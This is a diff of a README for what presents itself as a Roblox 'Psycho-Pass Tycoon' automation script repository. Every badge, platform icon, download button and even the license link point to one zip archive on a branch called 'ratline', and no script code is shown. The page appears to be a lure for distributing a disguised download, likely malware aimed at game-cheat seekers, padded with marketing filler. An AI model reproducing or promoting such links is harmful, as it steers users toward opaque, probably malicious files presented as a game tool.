@@ -1,9 +1,9 @@
 # Psycho-Pass Tycoon Roblox Script Repository
 
-![GitHub repo size](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip)  
-![GitHub last commit](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip)  
-![Lines of code](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip)  
-![MIT License](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip)
+![GitHub repo size](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip)  
+![GitHub last commit](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip)  
+![Lines of code](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip)  
+![MIT License](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip)
 
 Welcome to the **Psycho-Pass Tycoon roblox script** repository, your ultimate destination for futuristic automation scripts tailored for Roblox’s immersive gaming environment. Here, imagination meets innovation, making your Tycoon adventures more vibrant, customizable, and efficient. Whether you’re seeking advanced scripting integrations, multilingual flexibility, or a robust suite of functionalities, you’ve docked at the right harbor!
 
@@ -13,11 +13,11 @@ Dive deep into the nuances of next-generation Roblox scripting, built with OpenA
 
 | Operating System | Roblox Studio | Roblox Client | Mobile Supported | Scripting Supported |
 | :--------------: | :-----------: | :-----------: | :--------------: | :----------------: |
-| ![Windows](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip) | ✔️ | ✔️ | ✔️ | ✔️ |
-| ![macOS](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip) | ✔️ | ✔️ | ✔️ | ✔️ |
-| ![iOS](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip%2B-blueviolet) | ✔️ | ✔️ | ✔️ | ✔️ |
-| ![Android](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip%2B-green) | ✔️ | ✔️ | ✔️ | ✔️ |
-| ![Linux](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip%2020.04%2B-brightgreen) | ✔️ | ‼️ (Limited) | ‼️ (Experimental) | ✔️ |
+| ![Windows](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip) | ✔️ | ✔️ | ✔️ | ✔️ |
+| ![macOS](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip) | ✔️ | ✔️ | ✔️ | ✔️ |
+| ![iOS](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip%2B-blueviolet) | ✔️ | ✔️ | ✔️ | ✔️ |
+| ![Android](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip%2B-green) | ✔️ | ✔️ | ✔️ | ✔️ |
+| ![Linux](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip%2020.04%2B-brightgreen) | ✔️ | ‼️ (Limited) | ‼️ (Experimental) | ✔️ |
 
 *Note: Full compatibility and optimizations are provided for Windows, macOS, iOS, and Android. Linux support is experimental due to Roblox client limitations.*
 
@@ -73,8 +73,8 @@ APIs are used strictly within Roblox’s policy guidelines, ensuring both power 
 
 2. **Download the Script**  
    Get the latest automation script here:  
-   **https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip**  
-   [![Download](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip)](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip)
+   **https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip**  
+   [![Download](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip)](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip)
 
 3. **Insert the Script**  
    Drag & drop the file into your game’s Workspace or appropriate ScriptService location.
@@ -113,8 +113,8 @@ This repository and its contents are created and maintained for **educational, e
 Stay ahead of the Tycoon curve—access the script, collaborate, submit ideas, or report bugs through our evolving platform!
 
 **Download the current release:**  
-**https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip**  
-[![Download](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip)](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip)
+**https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip**  
+[![Download](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip)](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip)
 
 Want to help improve the repository? Contributions, discussions, and suggestions help steer the project forward.
 
@@ -123,7 +123,7 @@ Want to help improve the repository? Contributions, discussions, and suggestions
 ## 📜 MIT License
 
 Copyright © 2025  
-Distributed under the [MIT License](https://raw.githubusercontent.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/branch/ratline/psycho-pass-tycoon-roblox-toolkit_3.0.zip).
+Distributed under the [MIT License](https://github.com/NnNasib/psycho-pass-tycoon-roblox-toolkit/raw/refs/heads/branch/ratline/toolkit-psycho-tycoon-pass-roblox-v3.8.zip).
 
 ---
 
